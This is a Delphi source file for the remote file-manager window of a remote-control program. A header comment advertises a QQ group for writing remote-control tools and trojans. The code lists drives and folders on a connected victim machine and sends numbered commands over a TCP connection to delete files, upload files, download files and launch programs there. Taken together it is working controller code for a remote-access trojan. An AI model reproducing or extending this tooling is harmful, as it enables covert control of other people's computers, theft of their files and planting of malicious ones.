unit Unit6;
{作者BLOG ALALMN JACK     http://hi.baidu.com/alalmn  
远程控制和木马编写群30096995   }
interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ComCtrls, ToolWin, ExtCtrls, ImgList, Menus;

type
  Twenjian = class(TForm)
    Label1: TLabel;
    ListView1: TListView;
    TreeView1: TTreeView;
    ImageList1: TImageList;
    ListPopupMenu1: TPopupMenu;
    CopyMenu: TMenuItem;
    PastMenu: TMenuItem;
    DelMenu: TMenuItem;
    N16: TMenuItem;
    FindMenu: TMenuItem;
    NewDirMenu: TMenuItem;
    UpLoadMenu: TMenuItem;
    DownLoadMenu: TMenuItem;
    OpenMenu: TMenuItem;
    ShellExecMenu: TMenuItem;
    QuickViewMenu: TMenuItem;
    N17: TMenuItem;
    RefreshMenu: TMenuItem;
    N18: TMenuItem;
    ListMenu: TMenuItem;
    ReportMenu: TMenuItem;
    OpenDialog1: TOpenDialog;
    SaveDialog1: TSaveDialog;
    procedure FormShow(Sender: TObject);
    procedure TreeView1Change(Sender: TObject; Node: TTreeNode);
    procedure TreeView1Expanding(Sender: TObject; Node: TTreeNode;
      var AllowExpansion: Boolean);
    procedure ListView1DblClick(Sender: TObject);
    procedure DelMenuClick(Sender: TObject);
    procedure NewDirMenuClick(Sender: TObject);
    procedure UpLoadMenuClick(Sender: TObject);
    procedure DownLoadMenuClick(Sender: TObject);
    procedure ShellExecMenuClick(Sender: TObject);
    procedure RefreshMenuClick(Sender: TObject);
    procedure ListMenuClick(Sender: TObject);
    procedure ReportMenuClick(Sender: TObject);
     procedure GetComputer;
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  wenjian: Twenjian;
  nowfilenode, nowregnode: Ttreenode;
  Downloadpath:string;

implementation
uses
Unit10,Unit11,Unit9,Unit1;
{$R *.dfm}
function getfilesize(str: string): string;
var len: integer;
begin
    len := pos('|', str); //文件夹目录主要操作
    result := copy(str, 1, len - 1);
end;

function DiskInDrive(Drive: Char): Boolean;
var ErrorMode: word;
begin
  if Drive in ['a'..'z'] then Dec(Drive, $20);
  if not (Drive in ['A'..'Z']) then
  begin
    Result := False;
    Exit;
  end;
  ErrorMode := SetErrorMode(SEM_FailCriticalErrors);
  try
    if DiskSize(Ord(Drive) - $40) = -1 then
      Result := False
    else
      Result := True;
  finally
    SetErrorMode(ErrorMode);
  end;
end;

function FindFile(Path: string): string; {搜索文件夹和文件}
var
 Sr: TSearchRec;
  CommaList: TStringList;
  s: string;
  dt: TDateTime;
begin
  commalist := Tstringlist.Create;
  try
    Findfirst(path + '*.*', faAnyFile, sr);
    if ((Sr.Attr and faDirectory) > 0) and (Sr.Name <> '.') then
    begin
      dt := FileDateToDateTime(sr.Time);
      s := FormatDateTime('yyyy-mm-dd hh:nn', dt);
      commalist.add('*' + s + sr.name);
    end;
    while findnext(sr) = 0 do
    begin
      if ((Sr.Attr and faDirectory) > 0) and (Sr.Name <> '..') then
      begin
        dt := FileDateToDateTime(sr.Time);
        s := FormatDateTime('yyyy-mm-dd hh:nn', dt);
        commalist.add('*' + s + sr.name);
      end;
    end;
    FindClose(sr);
    FindFirst(path + '*.*', faArchive + faReadOnly + faHidden + faSysFile, Sr);
    if Sr.Attr <> faDirectory then
    begin
      dt := FileDateToDateTime(sr.Time);
      s := FormatDateTime('yyyy-mm-dd hh:nn', dt);
      commalist.add('\' + s+ Format('%.0n', [sr.Size / 1]) + '|' + sr.name);
    end; //Inttostr(
    while findnext(sr) = 0 do
    begin
      if (sr.Attr <> faDirectory) then
      begin
        dt := FileDateToDateTime(sr.Time);
        s := FormatDateTime('yyyy-mm-dd hh:nn', dt);
        commalist.add('\' + s +Format('%.0n', [sr.Size / 1]) + '|' + sr.name);
      end;
    end;
    FindClose(Sr);
  except
  end;
  Result := commalist.Text;
  commalist.Free;
end;

procedure GetDrivernum(var DiskList: TStringList);
var
  i: Char;
  AChar: array[1..3] of char;
  j: integer;
  drv: PChar;
begin
  for i := 'C' to 'Z' do
  begin
    if DiskInDrive(i) then
    begin
      AChar[1] := i;
      AChar[2] := ':';
      AChar[3] := #0;
      drv := @AChar;
      J := GetDriveType(drv);
      if J = DRIVE_REMOVABLE then
        DiskList.Add(i + ':4'); //(软盘)
      if J = DRIVE_FIXED then
        DiskList.Add(i + ':1'); //(硬盘)
      if J = DRIVE_REMOTE then
        DiskList.Add(i + ':3'); //(网络映射)
      if J = DRIVE_CDROM then
        DiskList.Add(i + ':2'); //(光盘)
      if J = DRIVE_RAMDISK then
        DiskList.Add(i + ':4'); // (虚拟盘)
      if J = DRIVE_UNKNOWN then
        DiskList.Add(i + ':4'); // (未知盘)
    end;
  end;
end;

procedure Twenjian.GetComputer;
var
  Drivernum, I: integer;
  TempStr: string;
  TMP: TTreeNode;
  RootDStrList: TStringList;
begin
  listview1.Items.BeginUpdate;
  Treeview1.items.BeginUpdate;
  try
    RootDStrList := TStringList.Create;
    GetDrivernum(RootDStrList);
    TreeView1.items.Item[0].DeleteChildren;
    ListView1.Items.Clear;
    for i := 0 to RootDStrList.Count - 1 do
    begin
      if RootDStrList[i] = '' then Break;  //停止

      TempStr := Copy(RootDStrList[i], 1, 2);

      TMP := Treeview1.items.AddChild(Treeview1.items.Item[0], TempStr);

      Drivernum := StrtoInt(Copy(RootDStrList[i], 3, 1));

      TMP.ImageIndex :=2;
      TMP.SelectedIndex := 2;

      TMP := Treeview1.items.AddChild(TMP, 'Loading...');
      TMP.ImageIndex := -1;
      TMP.SelectedIndex := -1;
      with ListView1.Items.Add do
      begin
        Caption := TempStr;
        subitems.text :=' ';
        ImageIndex := 2;
      end;
    end;
  finally
    RootDStrList.Free;
    ListView1.Items.EndUpdate;
    Treeview1.Items.EndUpdate;
  end;
end;

procedure Twenjian.FormShow(Sender: TObject);
var
TMP: TTreeNode;
begin
   if form1.ListView1.ItemIndex <> -1 then begin
    TMP:=TreeView1.Items.AddChild(TreeView1.Items.Item[0].getNextSibling,CurrentThread.Connection.Socket.Binding.IP);  //MainForm.ListView1.Selected.Caption);
    TMP.ImageIndex:=6;
    TMP.SelectedIndex:=6;
    TMP.Selected:=true;
   end;
end;

procedure Twenjian.TreeView1Change(Sender: TObject; Node: TTreeNode);
var
 Tempnode: TTreenode;
Tmpmemo: TStringlist;
path: string;
i:integer;
  tmplinestr, symbolstr, tmptimestr: string;
  TMP: TTreeNode;
begin
   ListView1.Items.Clear;
   if  TreeView1.Selected.ImageIndex <5 then
        Form1.Caption:='文件管理'+'---'+'我的电脑';
   if TreeView1.Selected.ImageIndex=0 then    //我的电脑
    begin
    GetComputer;
    exit;
    end;
   if  TreeView1.Selected.ImageIndex >5 then
        Form1.Caption:='文件管理'+'---'+CurrentThread.Connection.Socket.Binding.IP;

//------------------------------------本地文件
 if TreeView1.Selected.ImageIndex=2 then
  begin
  Tmpmemo:= TStringlist.Create;
  Tmpmemo.Clear;
  Tmpmemo.Text:=FindFile(TreeView1.Selected.Text+'\');
  //path:=TreeView1.Selected.Text+'\' ;
   if Tmpmemo.Text='' then
    begin
      Tmpmemo.Free;
      Exit;                       
    end;
     Treeview1.items.Delete(Treeview1.Selected.getFirstChild);
      Treeview1.Selected.DeleteChildren  ;
   for i:=0 to Tmpmemo.Count-1 do
   begin
      Tmplinestr := Tmpmemo.Strings[i];
      Symbolstr := Copy(tmplinestr, 1, 1);
      Tmptimestr := Copy(tmplinestr, 2, 16);
      Delete(tmplinestr, 1, 17);
    if symbolstr = '*' then
      begin
        TMP := Treeview1.items.AddChild(Treeview1.Selected, Tmplinestr);
        TMP.ImageIndex := 3;
        TMP.SelectedIndex := 4;
        TMP := Treeview1.items.AddChild(TMP, '.');
        TMP.ImageIndex := -1;
        TMP.SelectedIndex := -1;
        with ListView1.Items.Add do
        begin
          Caption := tmplinestr;
          subitems.text := ' ';
          ListView1.Items.Item[i].SubItems.Add(Tmptimestr);
          ImageIndex := 3;
        end;
      end;
    if symbolstr = '\' then
      begin
        with ListView1.Items.Add do
        begin
           Caption := copy(tmplinestr, length(getfilesize(tmplinestr)) + 2, length(tmplinestr));
          subitems.text := getfilesize(tmplinestr);
          ImageIndex :=5 ;
        end;
      end;

      end;
  end;
//----------------------------------------------------------------
 if TreeView1.Selected.ImageIndex=3 then
 begin
   //path:=path+ TreeView1.Selected.Text+'\';
   Tempnode := node;
     while tempnode.Parent <> nil do
      begin
        path := tempnode.text + '\' + path;
        Tempnode := tempnode.Parent;
      end;

   Tmpmemo:= TStringlist.Create;
   Tmpmemo.Clear;
   Tmpmemo.Text:=FindFile(path);
      if Tmpmemo.Text='' then
    begin
      Tmpmemo.Free;
      Exit;
    end;
    if Treeview1.Selected.HasChildren then
     Treeview1.items.Delete(Treeview1.Selected.getFirstChild);
   for i:=0 to Tmpmemo.Count-1 do
   begin
      Tmplinestr := Tmpmemo.Strings[i];
      Symbolstr := Copy(tmplinestr, 1, 1);
      Tmptimestr := Copy(tmplinestr, 2, 16);
      Delete(tmplinestr, 1, 17);
    if symbolstr = '*' then
      begin
        TMP := Treeview1.items.AddChild(Treeview1.Selected, Tmplinestr);
        TMP.ImageIndex := 3;
        TMP.SelectedIndex := 4;
        TMP := Treeview1.items.AddChild(TMP, '.');
        TMP.ImageIndex := -1;
        TMP.SelectedIndex := -1;
        with ListView1.Items.Add do
        begin
          Caption := tmplinestr;
          subitems.text := ' ';
          ListView1.Items.Item[i].SubItems.Add(Tmptimestr);
          ImageIndex := 3;
        end;
      end;
    if symbolstr = '\' then
      begin
        with ListView1.Items.Add do
        begin
          Caption := copy(tmplinestr, length(getfilesize(tmplinestr)) + 2, length(tmplinestr));
          subitems.text := getfilesize(tmplinestr);
          ImageIndex :=5 ;
        end;
      end;

      end;
 end;
//---------------------------------------------------------------
   if TreeView1.Selected.ImageIndex=6 then
      Form1.ZhuDongCmdSend('001','',false);

    if TreeView1.Selected.ImageIndex=7 then
    begin
     // Tmpmemo:= TStringlist.Create;
      //Tmpmemo.Clear;
      nowfilenode := node;
      Downloadpath:=TreeView1.Selected.Text+'\';
      Form1.ZhuDongCmdSend('002',TreeView1.Selected.Text+'\',false);
    end;
    if TreeView1.Selected.ImageIndex=8 then
    begin
       Tempnode := node;
       nowfilenode := node;
      while (tempnode.Parent <> nil) and (tempnode.ImageIndex <> 6 ) do
       begin
        path := tempnode.text + '\' + path;
        Tempnode := tempnode.Parent;
      end;
      Downloadpath:=path;
      Form1.ZhuDongCmdSend('002',path,false);
    end;
end;

procedure Twenjian.TreeView1Expanding(Sender: TObject; Node: TTreeNode;
  var AllowExpansion: Boolean);
begin
  AllowExpansion := (Node.getFirstChild.ImageIndex <> -1);
  if not (AllowExpansion) then
  begin
    TreeView1.Selected := Node;
  end;
end;

procedure Twenjian.ListView1DblClick(Sender: TObject);
var
i ,II:integer;
Strtmp: string;
begin
   if (ListView1.Selected.ImageIndex= 2) or (ListView1.Selected.ImageIndex=3) then
   begin
      Strtmp := TListView(sender).Selected.Caption;
      II := 0;
      for i := TreeView1.Selected.Index to TreeView1.Items.Count - 1 do
      begin
      if TreeView1.Selected.Item[II].Text = Strtmp then
      begin
        TreeView1.Selected.Item[II].Selected := True;
        Exit;
      end;
       inc(II);
     end;
   end;
end;

procedure Twenjian.DelMenuClick(Sender: TObject);
begin          //删除
   Form1.ZhuDongCmdSend('010',Downloadpath+ListView1.Selected.Caption,false);
   RefreshMenuClick(Sender);
end;

procedure Twenjian.NewDirMenuClick(Sender: TObject);
begin    //新建文件
xiwenjian.Show;
end;

procedure Twenjian.UpLoadMenuClick(Sender: TObject);
var
  AFileStream: TFileStream;
begin
    try
    if OpenDialog1.Execute then
    begin
      jindu.Show;
      AFileStream := TFileStream.Create(OpenDialog1.FileName, fmOpenRead);
      Form1.ZhuDongCmdSend('012',Downloadpath+ExtractFileName(OpenDialog1.FileName),false);
      try
      CurrentThread.Connection.OnWork:= Form1.IdTCPServer1Work;
      CurrentThread.Connection.OnWorkBegin:= Form1.IdTCPServer1WorkBegin;
      CurrentThread.Connection.OnWorkEnd:= Form1.IdTCPServer1WorkEnd;
      CurrentThread.Connection.WriteInteger(AFileStream.Size);
      CurrentThread.Connection.WriteStream(AFileStream);
      finally
      AFileStream.Free;
      end;
    end;

   except
   end;
   RefreshMenuClick(Sender);
end;

procedure Twenjian.DownLoadMenuClick(Sender: TObject);
var
  ASize:Int64;
  AFileStream: TFileStream;
begin
    try
    Form1.SaveDialog1.FileName:=ListView1.Selected.Caption;
    if Form1.SaveDialog1.Execute then
    begin
      jindu.Show;
   {   CurrentThread.Connection.OnWork:= MainForm.IdTCPServer1Work;
      CurrentThread.Connection.OnWorkBegin:= MainForm.IdTCPServer1WorkBegin;
      CurrentThread.Connection.OnWorkEnd:= MainForm.IdTCPServer1WorkEnd;
      AFileStream := TFileStream.Create(SaveDialog1.FileName, fmCreate);      }
      Form1.ZhuDongCmdSend('013',Downloadpath+ListView1.Selected.Caption,false);
   {   try
      ASize:= CurrentThread.Connection.ReadInteger();
      CurrentThread.Connection.ReadStream(AFileStream, ASize);
      finally
      AFileStream.Free;
      end;  }
    end;
   except
   end;
end;

procedure Twenjian.ShellExecMenuClick(Sender: TObject);
begin
   canshu.Show;
end;

procedure Twenjian.RefreshMenuClick(Sender: TObject);
begin
    try
     TreeView1Change(Sender, nowfilenode);
    except
    end;
end;

procedure Twenjian.ListMenuClick(Sender: TObject);
begin
   ListView1.ViewStyle:= vsList;
end;


procedure Twenjian.ReportMenuClick(Sender: TObject);
begin
    ListView1.ViewStyle:= vsReport;
end;

end.
